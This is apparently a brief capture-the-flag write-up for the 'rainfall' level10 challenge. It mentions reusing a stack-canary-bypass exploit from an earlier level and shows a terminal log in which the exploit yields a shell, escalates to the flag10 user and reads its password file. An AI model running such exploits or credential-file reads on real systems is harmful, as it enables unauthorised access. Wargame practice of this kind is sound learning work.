noting new for us lieteraly we use the same approach before in level09 and adjust the recvuntil's and the offsets for the main paylaod and the canary only.
```sh
level10@rainfall:~$ echo "" > exploit.py && vim exploit.py && python3 exploit.py
[+] Starting local process '/home/level10/tessier': pid 31607
[*] Switching to interactive mode
[T-A] Access denied. Session 0 terminated.
$ ls
exploit.py  tessier
$ whoami
flag10
$ cat /home/flag10/.pass
6lhi9nnjkxeye0p1jh1qniao8e89f4mq
```